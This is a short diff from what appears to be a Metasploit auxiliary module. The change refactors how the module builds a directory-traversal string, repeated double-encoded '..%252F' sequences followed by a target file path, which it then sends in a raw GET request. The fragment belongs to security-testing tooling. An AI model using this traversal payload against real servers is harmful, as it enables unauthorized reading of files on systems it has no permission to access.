@@ -41,7 +41,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     filename = datastore['FILEPATH']
-    traversal = "..%252F" * datastore['DEPTH'] << filename
+    traversal = "#{"..%252F" * datastore['DEPTH']}#{filename}"
 
     res = send_request_raw({
       'method' => 'GET',
